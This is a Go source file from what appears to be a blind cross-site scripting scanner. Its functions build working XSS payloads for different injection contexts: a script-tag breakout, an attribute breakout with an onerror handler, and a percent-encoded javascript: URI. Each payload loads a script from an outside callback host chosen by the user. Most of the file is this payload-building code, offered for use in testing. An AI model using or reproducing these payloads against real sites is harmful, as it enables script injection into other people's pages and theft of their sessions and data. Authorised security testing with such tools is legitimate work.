package payloads

import (
	"errors"
	"fmt"
	"html"
	"net/url"
	"strings"

	"github.com/ethicalhackingplayground/bxss/v2/pkg/arguments"
)

// linkPlaceholder is preserved by every context so trace mode can still
// substitute the scanned URL at request time.
const linkPlaceholder = "{LINK}"

// parseCallback parses a raw blind XSS callback into a structured URL.
// The callback must be an absolute http/https URL carrying a host:
// javascript:/data: URIs and hostless values are rejected so a navigable
// javascript: URI can never be smuggled in as an ordinary callback, and so
// every builder has scheme, host, port and query components to round-trip.
func parseCallback(raw string) (*url.URL, error) {
	if strings.TrimSpace(raw) == "" {
		return nil, errors.New("callback is empty")
	}

	u, err := url.Parse(raw)
	if err != nil {
		return nil, fmt.Errorf("parse callback %q: %w", raw, err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, fmt.Errorf("callback %q must use the http or https scheme, got %q", raw, u.Scheme)
	}
	if u.Host == "" {
		return nil, fmt.Errorf("callback %q is missing a host", raw)
	}

	return u, nil
}

// Build encodes a raw blind XSS callback for the given injection context.
// There is a single entry point and one structured-URL parse shared by every
// context; only the encoding order differs per context.
//
// The html branch is the identity branch: it returns the callback
// byte-for-byte so legacy payloads (including raw tag injection such as
// '"><script src=...></script>) keep working unchanged.
func Build(callback string, context arguments.Context) (string, error) {
	switch context {
	case arguments.ContextHTML, "":
		// Identity: preserve tag injection and exact legacy bytes.
		return callback, nil
	case arguments.ContextJS:
		return buildJS(callback)
	case arguments.ContextAttribute:
		return buildAttribute(callback)
	case arguments.ContextURI:
		return buildURI(callback)
	default:
		return "", fmt.Errorf("unsupported context %q", context)
	}
}

// BuildAll applies Build to every callback while preserving order. It is the
// transformation main applies before handing payloads to the scanner.
func BuildAll(callbacks []string, context arguments.Context) ([]string, error) {
	encoded := make([]string, len(callbacks))
	for i, callback := range callbacks {
		result, err := Build(callback, context)
		if err != nil {
			return nil, err
		}
		encoded[i] = result
	}
	return encoded, nil
}

// buildJS targets an inline <script> body or a JS string. It first closes an
// open single-quoted string and the surrounding script element, then injects
// a fresh script tag whose src is a single-quoted attribute. The callback is
// escaped for the JS string literal first (quotes and backslashes) and then
// HTML entity-encoded, so a quote in the callback cannot re-open the src
// attribute and angle brackets or ampersands cannot form stray markup.
func buildJS(raw string) (string, error) {
	u, err := parseCallback(raw)
	if err != nil {
		return "", err
	}

	literal := html.EscapeString(jsEscapeSingleQuoted(u.String()))

	return "'</script><script src='" + literal + "'></script>", nil
}

// buildAttribute targets a quoted HTML attribute. It breaks out of a single-
// or double-quoted attribute and binds an onerror handler. The callback is
// first turned into a single-quoted JS string, then the whole handler value
// is HTML entity-encoded: ampersands in the query string become &amp; here
// rather than being percent-encoded, which avoids double encoding when the
// value later lands in a navigable URI.
func buildAttribute(raw string) (string, error) {
	u, err := parseCallback(raw)
	if err != nil {
		return "", err
	}

	handler := "var s=document.createElement('script');s.src='" +
		jsEscapeSingleQuoted(u.String()) +
		"';document.body.appendChild(s)"

	// Entity-encode the handler value only; the breakout prefix, the
	// attribute delimiters and the tag-closing '>' must stay literal.
	handler = html.EscapeString(handler)

	return "'\" onerror='" + handler + "'>", nil
}

// buildURI targets a navigable position (href/src). It emits a javascript:
// URI whose script body is fully percent-encoded: the callback remains a JS
// string argument inside that body and is never appended as an ordinary
// query parameter. Every non-unreserved byte is percent-encoded, so no raw
// quote, ampersand, angle bracket or space survives into the URI.
func buildURI(raw string) (string, error) {
	u, err := parseCallback(raw)
	if err != nil {
		return "", err
	}

	body := "var s=document.createElement('script');s.src=\"" +
		jsEscapeDoubleQuoted(u.String()) +
		"\";document.body.appendChild(s)"

	return "javascript:" + percentEncode(body), nil
}

// jsEscapeSingleQuoted escapes a string for use inside a single-quoted JS
// string literal.
func jsEscapeSingleQuoted(value string) string {
	var builder strings.Builder
	for _, r := range value {
		switch r {
		case '\\':
			builder.WriteString(`\\`)
		case '\'':
			builder.WriteString(`\'`)
		case '\n':
			builder.WriteString(`\n`)
		case '\r':
			builder.WriteString(`\r`)
		case 0x2028:
			builder.WriteString(`\u2028`)
		case 0x2029:
			builder.WriteString(`\u2029`)
		default:
			builder.WriteRune(r)
		}
	}
	return builder.String()
}

// jsEscapeDoubleQuoted escapes a string for use inside a double-quoted JS
// string literal.
func jsEscapeDoubleQuoted(value string) string {
	var builder strings.Builder
	for _, r := range value {
		switch r {
		case '\\':
			builder.WriteString(`\\`)
		case '"':
			builder.WriteString(`\"`)
		case '\n':
			builder.WriteString(`\n`)
		case '\r':
			builder.WriteString(`\r`)
		case 0x2028:
			builder.WriteString(`\u2028`)
		case 0x2029:
			builder.WriteString(`\u2029`)
		default:
			builder.WriteRune(r)
		}
	}
	return builder.String()
}

// percentEncode percent-encodes every byte outside the RFC 3986 unreserved
// set (ALPHA / DIGIT / "-" / "." / "_" / "~"). Encoding the full javascript:
// body this way leaves no metacharacter that an HTML or URL parser could act
// on, and url.PathUnescape recovers the original body exactly. The trace-mode
// {LINK} placeholder is emitted verbatim: braces are not string or markup
// delimiters, and leaving the token intact lets the scanner substitute the
// scanned URL at request time.
func percentEncode(value string) string {
	const unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._~"

	var builder strings.Builder
	for i := 0; i < len(value); {
		if strings.HasPrefix(value[i:], linkPlaceholder) {
			builder.WriteString(linkPlaceholder)
			i += len(linkPlaceholder)
			continue
		}

		byteValue := value[i]
		if strings.IndexByte(unreserved, byteValue) >= 0 {
			builder.WriteByte(byteValue)
		} else {
			builder.WriteString(fmt.Sprintf("%%%02X", byteValue))
		}
		i++
	}
	return builder.String()
}
